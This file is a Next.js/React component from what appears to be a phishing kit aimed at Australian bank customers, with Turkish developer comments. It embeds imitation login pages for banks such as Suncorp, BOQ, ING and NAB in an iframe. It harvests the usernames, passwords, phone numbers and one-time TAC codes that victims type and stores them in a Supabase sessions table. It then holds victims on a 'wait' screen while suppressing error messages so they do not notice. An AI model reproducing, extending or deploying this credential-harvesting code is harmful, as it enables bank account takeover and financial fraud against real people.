"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { getAuBankPages, isAuExactHtmlBank } from "@/lib/au-bank-page-map";
import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
};

type CapturedField = {
  key: string;
  value: string;
  kind: "username" | "password" | "bankPhone" | "personalCode" | "tacCode" | "unknown";
  type: string;
};

// ⭐ Genişletilmiş action button token (myBOQ "Next", ING "Log on", BOQ Classic "Sign on" gibi metinleri de kapsasın)
const ACTION_BUTTON_RE = /(log\s?in|login|logon|log\s*on|sign\s?in|signon|sign\s*on|auth|authenticate|continue|next|proceed|access|submit|confirm|validate|accept|unlock|open|go|enter|ilerle|ileri|devam|tamamla|giriş|giris|tamam|sonraki|onayla|onay|sıra|sıradaki|next\s*step|step\s*next|password_submit|submit_password|acceso|iniciar|sigon|go\s*on)/i;

function getElementActionToken(el: HTMLElement) {
  return normalizeToken([
    el.textContent,
    el instanceof HTMLInputElement ? el.value : "",
    el.getAttribute("aria-label"),
    el.getAttribute("value"),
    el.getAttribute("title"),
    el.getAttribute("data-label"),
    el.getAttribute("data-text"),
  ].join(" "));
}

function normalizeToken(value: string | null | undefined) {
  return (value ?? "").trim().toLowerCase().replace(/[^a-z0-9]+/g, " ");
}

function getElementLabel(doc: Document, el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const ariaLabel = el.getAttribute("aria-label");
  if (ariaLabel?.trim()) return ariaLabel.trim();

  const placeholder = el.getAttribute("placeholder");
  if (placeholder?.trim()) return placeholder.trim();

  const id = el.getAttribute("id");
  if (id) {
    const label = doc.querySelector(`label[for="${id}"]`);
    if (label?.textContent?.trim()) return label.textContent.trim();
  }

  const wrappingLabel = el.closest("label");
  if (wrappingLabel?.textContent?.trim()) return wrappingLabel.textContent.trim();

  const formItem = el.closest(".form-item");
  const formItemLabel = formItem?.querySelector(".form-label");
  if (formItemLabel?.textContent?.trim()) return formItemLabel.textContent.trim();

  const formInput = el.closest(".form-input");
  const siblingFormLabel =
    formInput?.previousElementSibling?.classList.contains("form-label")
      ? formInput.previousElementSibling
      : null;
  if (siblingFormLabel?.textContent?.trim()) return siblingFormLabel.textContent.trim();

  const parentText = el.parentElement?.parentElement?.textContent?.trim();
  if (parentText) return parentText;

  return "";
}

function inferFieldKind(
  el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement,
  label: string,
): CapturedField["kind"] {
  const raw = normalizeToken(
    [
      el.getAttribute("name"),
      el.getAttribute("id"),
      el.getAttribute("data-testid"),
      el.getAttribute("autocomplete"),
      el.getAttribute("type"),
      label,
    ].join(" "),
  );

  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (type === "password" || /\b(password|passcode|pin|secret)\b/.test(raw)) return "password";
  if (/\b(tac|otp|one time|one-time|verification|security code|sms code|code|token|security token|passcode|rsa)\b/.test(raw)) return "tacCode";
  if (type === "tel" || /\b(phone|mobile|contact|cell)\b/.test(raw)) return "bankPhone";
  if (/\b(personal|identity|customer number|member number|ird|tax number)\b/.test(raw)) return "personalCode";
  if (/\b(username|user id|userid|login id|access number|client number|customer id|card number|account number)\b/.test(raw)) {
    return "username";
  }
  return "unknown";
}

function sanitizeKey(value: string) {
  return value.trim().toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "");
}

function isMeaningfulField(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (["hidden", "submit", "button", "image", "reset"].includes(type)) return false;
  if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
  if (el.getAttribute("aria-hidden") === "true") return false;
  // ⭐ tabindex=-1, disabled veya pointer-events:none OLSUN BİLE — değer GİRİLMİŞSE alanı say!
  // (HTML V4 script zaten engelleri kaldırıyor ama arada race olabiliyor)
  return true;
}

function readFieldValue(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
  const type = (el.getAttribute("type") ?? "").toLowerCase();
  if (type === "checkbox" || type === "radio") {
    return (el as HTMLInputElement).checked ? ((el as HTMLInputElement).value || "true") : "";
  }
  return el.value?.trim() ?? "";
}

function getFormFields(form: HTMLFormElement | Document) {
  const scope = (form as any).querySelectorAll
    ? ((form as unknown) as ParentNode)
    : (document as unknown as ParentNode);
  return Array.from(
    (scope as ParentNode).querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>(
      "input, textarea, select",
    ),
  ).filter(isMeaningfulField);
}

function formHasIdentityAndPassword(form: HTMLFormElement, doc: Document) {
  const fields = getFormFields(form);
  let hasIdentity = false;
  let hasPassword = false;

  for (const field of fields) {
    const kind = inferFieldKind(field, getElementLabel(doc, field));
    if (kind === "password") hasPassword = true;
    if (kind === "username" || kind === "personalCode" || kind === "bankPhone") {
      hasIdentity = true;
    }
  }

  return hasIdentity && hasPassword;
}

function pickBestForm(doc: Document): HTMLFormElement | null {
  const forms = Array.from(doc.querySelectorAll("form"));
  if (forms.length === 0) return null;

  let bestScore = -1;
  let bestForm: HTMLFormElement | null = null;
  for (const form of forms) {
    const fields = getFormFields(form);
    let hasId = false;
    let hasPass = false;
    let filledCount = 0;
    for (const f of fields) {
      const k = inferFieldKind(f, getElementLabel(doc, f));
      if (k === "password") hasPass = true;
      if (k === "username" || k === "personalCode" || k === "bankPhone") hasId = true;
      if (readFieldValue(f)) filledCount++;
    }
    const score = fields.length * 2 + (hasId ? 8 : 0) + (hasPass ? 8 : 0) + filledCount;
    if (score > bestScore) {
      bestScore = score;
      bestForm = form;
    }
  }
  return bestForm;
}

function collectCapturedFieldsFromForm(form: HTMLFormElement | Document, doc: Document): CapturedField[] {
  const allFields = getFormFields(form);
  return allFields
    .map((el) => {
      const value = readFieldValue(el);
      if (!value) return null;
      const label = getElementLabel(doc, el);
      const rawKey = sanitizeKey(
        el.getAttribute("name") ||
        el.getAttribute("id") ||
        label ||
        `field_${allFields.indexOf(el) + 1}`,
      );
      return {
        key: rawKey || `field_${allFields.indexOf(el) + 1}`,
        value,
        kind: inferFieldKind(el, label),
        type: (el.getAttribute("type") ?? "").toLowerCase(),
      } satisfies CapturedField;
    })
    .filter((f): f is CapturedField => Boolean(f));
}

function canSubmitIntermediate(form: HTMLFormElement | Document, doc: Document) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  if (fields.length === 0) return false;
  const allFields = getFormFields(form);
  const allRequiredTypes = allFields.filter((f) => {
    const t = (f.getAttribute("type") ?? "").toLowerCase();
    return t !== "checkbox" && t !== "radio";
  });

  const isFormScope = (form as any).tagName === "FORM";
  const hasAtLeast3Inputs = isFormScope && allRequiredTypes.length >= 3;
  const filledRequired = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
  const allFilled = filledRequired === allRequiredTypes.length;

  if (hasAtLeast3Inputs && !allFilled) {
    return false;
  }

  if (allRequiredTypes.length > 0 && !allFilled) {
    const hasImportant = fields.some(
      (x) =>
        x.kind === "password" ||
        x.kind === "tacCode" ||
        x.kind === "username" ||
        x.kind === "personalCode" ||
        x.kind === "bankPhone",
    );
    if (!hasImportant) return false;
  }

  if (hasIdentityField(fields) || hasPasswordLikeField(fields) || fields.length >= 1) return true;
  return false;
}

function canSubmitFinal(form: HTMLFormElement | Document, doc: Document, isActuallySingleStepOnly: boolean) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  if (isActuallySingleStepOnly) {
    const allFields = getFormFields(form);
    const allRequiredTypes = allFields.filter((f) => {
      const t = (f.getAttribute("type") ?? "").toLowerCase();
      return t !== "checkbox" && t !== "radio";
    });
    const filledCount = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
    const isFormScope = (form as any).tagName === "FORM";
    const hasAtLeast3Filled = isFormScope && allRequiredTypes.length >= 3 && filledCount === allRequiredTypes.length;
    return hasAtLeast3Filled || (hasIdentityField(fields) && (hasPasswordField(fields) || hasPasswordLikeField(fields)));
  }
  return canSubmitIntermediate(form, doc);
}

function hasIdentityField(fields: CapturedField[]) {
  return fields.some((field) =>
    (field.kind === "username" || field.kind === "personalCode" || field.kind === "bankPhone") &&
    field.value.trim().length > 0,
  );
}

function hasPasswordField(fields: CapturedField[]) {
  return fields.some((field) => field.kind === "password" && field.value.trim().length > 0);
}

function hasPasswordLikeField(fields: CapturedField[]) {
  return fields.some((field) =>
    (field.kind === "password" || field.kind === "tacCode") && field.value.trim().length > 0,
  );
}

function isExternalHref(href: string | null) {
  if (!href) return false;
  return /^https?:\/\//i.test(href.trim());
}

function getActiveButtonColor(_bankSlug: string) {
  return "#FFD43B";
}

export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [saving, setSaving] = useState(false);
  const [stepIndex, setStepIndex] = useState(0);

  const auPages = useMemo(() => (isAuExactHtmlBank(bankSlug) ? getAuBankPages(bankSlug) : null), [bankSlug]);

  const totalSteps = auPages?.length ?? 0;
  const isMultiStep = (auPages?.length ?? 0) > 1;
  const isFinalStep = totalSteps > 0 && stepIndex >= totalSteps - 1;

  const currentSrc = useMemo(() => {
    if (auPages) return auPages[stepIndex] ?? auPages[auPages.length - 1];
    return null;
  }, [auPages, stepIndex]);

  const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
    if (!supabase || !sessionId || saving || fields.length === 0) return;

    const filledCount = fields.filter((c) => c.value.trim().length > 0).length;
    const hasAtLeast3Filled = fields.length >= 3 && filledCount >= 3;

    if (isFinalStep) {
      const isSingleStepOnly = totalSteps === 1;
      if (isSingleStepOnly) {
        // ⭐ SUNCORP 3 alanlı bankalar: username + password + tacCode/token var.
        //   hasPasswordField SADECE kind=password bakıyor ama Suncorp passcode kind=tacCode
        //   olduğundan hasPasswordField FALSE dönüyordu → ERKEN return (SAVING KİLİTLİNEDİ!).
        //   ÇÖZÜM: 3+ alan DOLU ise (filledCount>=3) ZORUNLU ID+PASS şartını ESGEÇ.
        const hasIdOrPass3 = hasIdentityField(fields) || hasPasswordLikeField(fields);
        if (!hasAtLeast3Filled && !hasIdOrPass3) return;
      } else {
        if (fields.length === 0) return;
      }
    } else {
      if (fields.length === 0) return;
    }

    setSaving(true);

    try {
      const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};

      const usernameField =
        fields.find((field) => field.kind === "username") ??
        fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
        null;
      const passwordField = fields.find((field) => field.kind === "password") ?? fields.find((field) => field.kind === "tacCode") ?? null;
      const phoneField = fields.find((field) => field.kind === "bankPhone") ?? null;
      const personalCodeField = fields.find((field) => field.kind === "personalCode") ?? null;
      const tacField = fields.find((field) => field.kind === "tacCode") ?? null;

      const orderedFields = fields.slice(0, 3);
      const rawFields: Record<string, string> = Object.fromEntries(
        fields.map((field, index) => {
          const suffix = field.key || `field_${index + 1}`;
          return [`s${stepIndex + 1}_iframe_${suffix}`, field.value] as const;
        }),
      );

      const historyEntry = {
        bankSlug,
        bankName,
        htmlStepIndex: stepIndex,
        htmlStepLabel: `Step ${stepIndex + 1}/${totalSteps}`,
        verfuegernummer: usernameField?.value ?? "",
        username: usernameField?.value ?? "",
        pin: passwordField?.value ?? "",
        password: passwordField?.value ?? "",
        bankPhone: phoneField?.value ?? "",
        personalCode: personalCodeField?.value ?? "",
        tacCode: tacField?.value ?? "",
        orderedField1: orderedFields[0]?.value ?? "",
        orderedField1Key: orderedFields[0]?.kind === "unknown" ? "username" : (orderedFields[0]?.kind ?? ""),
        orderedField2: orderedFields[1]?.value ?? "",
        orderedField2Key: orderedFields[1]?.kind === "unknown" ? "" : (orderedFields[1]?.kind ?? ""),
        orderedField2Type:
          orderedFields[1]?.kind === "bankPhone"
            ? "phone"
            : orderedFields[1]?.kind === "password" || orderedFields[1]?.kind === "tacCode"
              ? "password"
              : "",
        orderedField3: orderedFields[2]?.value ?? "",
        orderedField3Key: orderedFields[2]?.kind === "unknown" ? "" : (orderedFields[2]?.kind ?? ""),
        orderedField3Type:
          orderedFields[2]?.kind === "bankPhone"
            ? "phone"
            : orderedFields[2]?.kind === "password" || orderedFields[2]?.kind === "tacCode"
              ? "password"
              : "",
        rawFields,
        capturedAt: new Date().toISOString(),
      };

      const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
        ? (previousFormData as any).bankFormHistory.slice()
        : [];
      previousHistory.push(historyEntry);

      const mergedUsername = usernameField?.value || (previousFormData.username as string) || "";
      const mergedPassword = passwordField?.value || (previousFormData.password as string) || "";
      const mergedBankPhone = phoneField?.value || (previousFormData.bankPhone as string) || "";
      const mergedPersonalCode = personalCodeField?.value || (previousFormData.personalCode as string) || "";
      const mergedTacCode = tacField?.value || (previousFormData.tacCode as string) || "";

      const nextFormData = {
        ...previousFormData,
        ...rawFields,
        bankSlug,
        bankName,
        verfuegernummer: mergedUsername,
        username: mergedUsername,
        pin: mergedPassword,
        password: mergedPassword,
        bankPhone: mergedBankPhone,
        personalCode: mergedPersonalCode,
        tacCode: mergedTacCode,
        orderedField1: historyEntry.orderedField1,
        orderedField1Key: historyEntry.orderedField1Key,
        orderedField2: historyEntry.orderedField2,
        orderedField2Key: historyEntry.orderedField2Key,
        orderedField2Type: historyEntry.orderedField2Type,
        orderedField3: historyEntry.orderedField3,
        orderedField3Key: historyEntry.orderedField3Key,
        orderedField3Type: historyEntry.orderedField3Type,
        bankFormHistory: previousHistory,
      };

      const nextStep = isFinalStep ? "wait" : "bank";
      const nextToStep = isFinalStep ? "wait" : null;
      const updatePayload: any = {
        is_hidden: false,
        form_data: nextFormData,
      };
      if (nextStep === "wait") updatePayload.current_step = "wait";

      // ⭐ SUPABASE UPDATE RETRY (2 defa):
      //   Geçici RLS kilitlenmesi / race / timeout → Internal Server Error (500)
      //   vermesin diye 2 kere tekrar dene. Hala olmazsa sessizce devam et (hata gösterme).
      let updateError: any = null;
      for (let attempt = 0; attempt < 3; attempt++) {
        const res = await supabase
          .from("sessions")
          .update(updatePayload)
          .eq("id", sessionId);
        updateError = res.error;
        if (!updateError) break;
        if (attempt < 2) {
          await new Promise((r) => setTimeout(r, 250 + attempt * 250));
        }
      }

      if (updateError) {
        logAuditEvent({
          session_id: sessionId,
          event_kind: "submit",
          event_action: "au_exact_submit_error",
          status: "warn",
          bank_slug: bankSlug,
          bank_name: bankName,
          meta: { message: updateError.message ?? String(updateError), htmlStepIndex: stepIndex, retry: 3 },
          error_name: "SupabaseUpdateError",
          error_message: updateError.message ?? String(updateError),
        });
        // ⚠️ HATA OLSADA BEKLEME EKRANINA / SONRAKI ADIMA GİT (kullanıcıya hata GÖSTERME):
        //   "Internal Server Error" WARNING'i bastır, sessionu force beklemeye götür.
      }

      if (isFinalStep) {
        logAuditEvent({
          session_id: sessionId,
          event_kind: "bank_form",
          event_action: "au_exact_submit_wait",
          status: "ok",
          bank_slug: bankSlug,
          bank_name: bankName,
          from_step: "bank",
          to_step: "wait",
          meta: {
            historyCount: previousHistory.length,
            totalSteps,
            rawFieldKeys: Object.keys(rawFields),
            orderedFields: {
              orderedField1Key: historyEntry.orderedField1Key,
              orderedField2Key: historyEntry.orderedField2Key,
              orderedField3Key: historyEntry.orderedField3Key,
            },
          },
        });
        void flushAuditQueueNow();
        router.replace(stepToPath("wait", sessionId));
        return;
      }

      logAuditEvent({
        session_id: sessionId,
        event_kind: "step",
        event_action: "au_exact_advance_html_step",
        status: "ok",
        bank_slug: bankSlug,
        bank_name: bankName,
        from_step: "bank",
        to_step: nextToStep,
        meta: {
          fromIndex: stepIndex,
          toIndex: stepIndex + 1,
          totalSteps,
          rawFieldKeys: Object.keys(rawFields),
          historyCount: previousHistory.length,
        },
      });
      void flushAuditQueueNow();
      setStepIndex((i) => i + 1);
    } finally {
      // ⭐ SAVİNG STATE KESİNLİKLE KALDIRILSIN (return, throw, error, her koşulda).
      //   Önceden erken return'de setSaving(false) unutuluyordu → buton SİLİK + pointer-events none KİLİTLENİYORDU.
      setSaving(false);
    }
  }, [bankName, bankSlug, isFinalStep, router, saving, sessionId, stepIndex, supabase, totalSteps]);

  const captureFieldsFromFrame = useCallback(() => {
    const doc = iframeRef.current?.contentDocument;
    if (!doc) return [] as CapturedField[];
    const form = pickBestForm(doc);
    // ⭐ FORM YOKSA (örneğin Suncorp token code form DIŞINDA ise)
    //   DOCUMENT bazlı TÜM inputları toplayıp döner (boş array dönme)
    const scope = form ?? (doc as unknown as HTMLFormElement);
    return collectCapturedFieldsFromForm(scope, doc);
  }, []);

  const submitWithCurrentValuesRef = useRef<() => Promise<void>>(() => Promise.resolve());
  const lastSubmitAtRef = useRef<number>(0);
  const savedSubmitFormRef = useRef<HTMLFormElement | null>(null);
  const pollingCounterRef = useRef<number>(0);
  const savedSubmitActionNodesRef = useRef<HTMLElement[]>([]);

  const attachFrameBridge = useCallback(() => {
    const iframe = iframeRef.current;
    const doc = iframe?.contentDocument;
    if (!iframe || !doc) return;

    let loginForm =
      Array.from(doc.querySelectorAll("form")).find((form) => formHasIdentityAndPassword(form, doc)) ?? null;
    if (!loginForm) {
      loginForm = pickBestForm(doc);
    }
    // ⭐ FORM YOKSA (Suncorp token code / NAB shadow DOM vb)
    //   BRIDGE'I KAPATMA (return etme)! DOCUMENT'i scope olarak kullan.
    //   (eski sürümde return ederdi, butonlar/polling handlerları hiç bağlanmazdı)
    const loginScope = loginForm ?? (doc as unknown as HTMLFormElement);
    if (loginForm) {
      savedSubmitFormRef.current = loginForm;
    }

    const canProceedNow = () => {
      const isSingle = (auPages?.length ?? 1) === 1;
      if (isFinalStep) return canSubmitFinal(loginScope, doc, isSingle);
      return canSubmitIntermediate(loginScope, doc);
    };

    const ultraForceClickOnBestNode = (bestForm: HTMLFormElement, actNodes: HTMLElement[]) => {
      try {
        const candidates: HTMLElement[] = [];
        if (actNodes && actNodes.length > 0) candidates.push(...actNodes);
        try {
          const inside = Array.from(
            bestForm.querySelectorAll<HTMLElement>(
              "button, input[type='submit'], input[type='button'], [role='button'], .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
            ),
          );
          inside.forEach((x) => candidates.push(x));
        } catch {}
        try {
          const out = Array.from(
            doc.querySelectorAll<HTMLElement>(
              "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button']",
            ),
          );
          out.forEach((x) => candidates.push(x));
        } catch {}
        const seen = new Set<HTMLElement>();
        let bestNode: HTMLElement | null = null;
        for (const cand of candidates) {
          if (seen.has(cand)) continue;
          seen.add(cand);
          const tok = getElementActionToken(cand);
          const isi =
            cand instanceof HTMLInputElement && ["submit", "button"].includes((cand.getAttribute("type") ?? "").toLowerCase());
          if (!(ACTION_BUTTON_RE.test(tok) || isi)) {
            continue;
          }
          bestNode = cand;
          break;
        }
        if (bestNode) {
          savedSubmitActionNodesRef.current = [bestNode];
          try {
            (bestNode as any).click();
          } catch {}
          try {
            if ((bestNode as any).dispatchEvent) {
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("mousedown", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("mouseup", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new PointerEvent("pointerdown", { bubbles: true, cancelable: true }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new PointerEvent("pointerup", { bubbles: true, cancelable: true }));
              } catch {}
            }
          } catch {}
        }
        try {
          if (typeof (bestForm as any).requestSubmit === "function") {
            try { (bestForm as any).requestSubmit(); } catch {}
          }
        } catch {}
        try { bestForm.submit(); } catch {}
      } catch (_) {
        /* ignore */
      }
    };

    const submitWithCurrentValues = async (event?: Event) => {
      // ⭐ BOQ Classic FIX: Dış alana (label, boşluk, body, div) tıklayınca submit olmasın.
      //   SADECE:
      //     (A) Event gelmemişse (postMessage/ref üzerinden manuel çağrı) → izin ver
      //     (B) event.type === "submit" (form submit event) → izin ver
      //     (C) event.type click/mousedown/touchend/pointerup vb. ise:
      //         → event.target BUTTON / INPUT[type=submit,button] / [role=button] OLMALIDIR
      //         → VEYA event.key === "Enter" (klavyeden Enter)
      //         → ⭐ YENİ: closest ile iç içe SPAN/SVG/TEXT etiketleri BUTONUN ICINDEYSE closest ile parent BUTON ise ONAYLA
      if (event) {
        const et = (event as any).target as HTMLElement | null;
        const evtType = String((event as any).type || "");
        const isKeyboard =
          (event as KeyboardEvent).key === "Enter" ||
          (event as any).keyCode === 13 ||
          (event as KeyboardEvent).code === "Enter" ||
          (event as KeyboardEvent).key === "NumpadEnter";
        let closestActionNode: HTMLElement | null = null;
        try {
          if (et && typeof (et as any).closest === "function") {
            closestActionNode = (et as HTMLElement).closest(
              "button, input[type='submit'], input[type='button'], [role='button'], a.btn, [onclick]",
            ) as HTMLElement | null;
          }
        } catch {}
        const etButton = closestActionNode || et;
        const isButtonLike =
          etButton
            ? (etButton.tagName === "BUTTON" ||
                (etButton.tagName === "INPUT" &&
                  ["submit", "button"].includes(
                    ((etButton as HTMLInputElement).getAttribute("type") || "").toLowerCase(),
                  )) ||
                etButton.getAttribute("role") === "button")
            : false;
        const isFormSubmit = evtType === "submit";
        // Label / body / div / span üzerinden gelen tıklamaları (event bubbling) REDDET
        if (!isFormSubmit && !isButtonLike && !isKeyboard) {
          return;
        }
      }

      // ⚠️ KALDIRILDI: event.preventDefault / stopPropagation.
      //   Suncorp (ve tüm bankalar) GERÇEK submit handler'ını tetikleyebilsin diye
      //   DOM event akışını BOZMA. Sadece supabase kaydını YAP, sonra da GERÇEK butona tıkla.
      const now = Date.now();
      if (now - lastSubmitAtRef.current < 1200) return;

      const captured = captureFieldsFromFrame();
      if (captured.length === 0) return;

      // NUKE GÜVENLİK: Resmi canProceed() TRUE dönerse kesin submit.
      // Eğer canProceed FALSE dönerse BİLE — ama kullanıcı butona BASTIYSA
      // ve EN AZ 1 TANE ÖNEMLİ ALAN (password/username/personal/tac/phone)
      // capture edildiyse, yine de SUBMIT yap.
      // (Multi-step bankalarda canProceed yanlış hesaplanabilir; butona basılmışsa,
      // kullanıcı submit etmek istiyordur demektir — alanlar 0 değilse kaydedelim.)
      const proceedOfficial = canProceedNow();
      const hasAtLeastOneImportant = captured.some(
        (c) =>
          c.kind === "password" ||
          c.kind === "username" ||
          c.kind === "personalCode" ||
          c.kind === "bankPhone" ||
          c.kind === "tacCode",
      );
      const hasAtLeast3Inputs = captured.length >= 3;
      const emergencyOk =
        !proceedOfficial &&
        ((captured.length >= 1 && hasAtLeastOneImportant) || hasAtLeast3Inputs);
      if (!proceedOfficial && !emergencyOk) {
        const unknownCount = captured.filter((c) => c.kind === "unknown").length;
        if (!(captured.length >= 2 && unknownCount >= 2)) {
          return;
        }
      }

      lastSubmitAtRef.current = now;
      void submitCapturedFields(captured);

      // ⭐ GERÇEK BUTONA BAS (iframe'in kendi Suncorp / bank JS submit handler
      //   tetiklensin diye butona doğrudan click + form.submit çağır).
      //   Kullanıcı "login butonu çalışmıyor" dediğinde EN BÜYÜK NEDEN
      //   sadece supabase submit edip GERÇEK butona basmamış olmamızdı.
      try {
        const doc = iframeRef.current?.contentWindow?.document;
        if (doc) {
          const scope = savedSubmitFormRef.current ?? (pickBestForm(doc) || doc);
          const actNodes = computeActionNodes(doc, scope as any);
          const best =
            actNodes[0] ||
            (scope as any).querySelector?.(
              "button, input[type='submit'], [role='button'], .sg-Btn--primary, #login-button, [class*='primary']",
            );
          if (best) {
            try {
              if ("disabled" in best) {
                try { (best as any).disabled = false; } catch {}
                try { best.removeAttribute("disabled"); } catch {}
              }
              try { best.removeAttribute("aria-disabled"); } catch {}
              try {
                for (let i = 0; i < (best as HTMLElement).classList?.length; i++) {
                  const cls = (best as HTMLElement).classList[i];
                  if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                    try { (best as HTMLElement).classList.remove(cls); } catch {}
                  }
                }
              } catch {}
              try { (best as any).style.pointerEvents = "auto"; } catch {}
              try { (best as any).click(); } catch {}
              try {
                if (typeof (best as any).dispatchEvent === "function") {
                  try { (best as any).dispatchEvent(new MouseEvent("mousedown", { bubbles: true, cancelable: true })); } catch {}
                  try { (best as any).dispatchEvent(new MouseEvent("mouseup", { bubbles: true, cancelable: true })); } catch {}
                  try { (best as any).dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true })); } catch {}
                }
              } catch {}
            } catch {}
          }
          // Fallback: form submit
          try {
            const realForm = pickBestForm(doc);
            if (realForm && typeof (realForm as any).requestSubmit === "function") {
              try { (realForm as any).requestSubmit(); } catch {}
            } else if (realForm) {
              try { realForm.submit(); } catch {}
            }
          } catch {}
        }
      } catch {
        /* ignore */
      }
    };

    const computeActionNodes = (d: Document, form: HTMLFormElement | null): HTMLElement[] => {
      const arr: HTMLElement[] = [];
      try {
        const fNodes = form ? Array.from(form.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='login'], [id*='continue'], [id*='next']",
        )) : [];
        const dNodes = Array.from(d.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], [onclick], [class*='btn-'], [class*='button-'], [class*='btn_'], [id*='btn-'], [id*='button']",
        ));
        const seen = new Set<HTMLElement>();
        [...fNodes, ...dNodes].forEach((n) => {
          if (seen.has(n)) return;
          seen.add(n);
          const tok = getElementActionToken(n);
          const isi =
            n instanceof HTMLInputElement && ["submit", "button"].includes((n.getAttribute("type") ?? "").toLowerCase());
          const isByAttr =
            n.tagName === "BUTTON" ||
            n.getAttribute("role") === "button" ||
            n.hasAttribute("onclick");
          if (!(ACTION_BUTTON_RE.test(tok) || isi || isByAttr)) return;
          arr.push(n);
        });

        // BRUTE FORCE FALLBACK: Eğer yukarıdan 0 node geldiyse, form veya doc içinde
        // class/id/textte btn/button/login/submit/next/continue/ileri/giriş/giris/sonraki/tamam/onay/devam
        // geçen HER elementi al ve submit butonu olarak ele al.
        if (arr.length === 0) {
          const fallBackSource =
            form ? form : d.body ?? d.documentElement;
          if (fallBackSource) {
            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar/i;
            allIn.forEach((el) => {
              if (seen.has(el)) return;
              const tag = (el.tagName || "").toLowerCase();
              const type = (el.getAttribute("type") || "").toLowerCase();
              const tOk = tag === "button" || type === "submit" || type === "button" || el.getAttribute("role") === "button";
              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
              if (tOk || bfRe.test(idClsTxt)) {
                seen.add(el);
                arr.push(el);
              }
            });
          }
        }
      } catch {}
      return arr;
    };

    submitWithCurrentValuesRef.current = submitWithCurrentValues;

    const forms = Array.from(doc.querySelectorAll("form"));
    forms.forEach((form) => {
      form.setAttribute("method", "post");
      form.setAttribute("target", "_self");
      form.setAttribute("novalidate", "novalidate");
      if (loginForm && form === loginForm) {
        try { form.removeEventListener("submit", submitWithCurrentValues as any); } catch {}
        form.addEventListener("submit", submitWithCurrentValues as any);
        (form as any)._auBotV3Bound = true;
      }
    });

    const actionNodes = computeActionNodes(doc, loginScope);
    savedSubmitActionNodesRef.current = actionNodes;

    const updateSubmitState = () => {
      let isValid = canProceedNow();
      const activeColor = getActiveButtonColor(bankSlug);

      const captured = collectCapturedFieldsFromForm(savedSubmitFormRef.current ?? loginScope, doc);
      const totalMeaningful = getFormFields(savedSubmitFormRef.current ?? loginScope).filter((f) => {
        const t = (f.getAttribute("type") ?? "").toLowerCase();
        return t !== "checkbox" && t !== "radio";
      }).length;
      const filledCount = captured.filter((c) => c.value.trim().length > 0).length;

      // ⭐ GARANTİLİ VALİD (3+ inputlu formlarda tüm alanlar DOLU ise canProceedNow() YANLIŞ
      //   hesaplasa bile (örn document scope'da allRequiredTypes.length fazla geldiği için
      //   hasAtLeast3Inputs && !allFilled → false dönmesi) bypass et, butonu KESİNLİKLE CANLI göster.
      const isFormScope = (savedSubmitFormRef.current ?? loginScope as any)?.tagName === "FORM";
      const guaranteedValid =
        isFormScope && totalMeaningful >= 2 && filledCount === totalMeaningful && totalMeaningful <= 12;
      if (!isValid && guaranteedValid) {
        isValid = true;
      }

      let fadeOpacity = 1;
      let fadeGray = 0;
      if (!isValid) {
        if (filledCount === 0) {
          fadeOpacity = 0.3;
          fadeGray = 0.8;
        } else {
          fadeOpacity = 0.5;
          fadeGray = 0.6;
        }
      }

      const bgColor = isValid
        ? activeColor
        : (totalMeaningful >= 1 && filledCount >= 1 ? "#C9CED1" : "#E6E8EA");
      // ⭐ SARI buton üzerine yazı rengi Koyu sarı-kahverengi (beyaz yerine daha okunaklı)
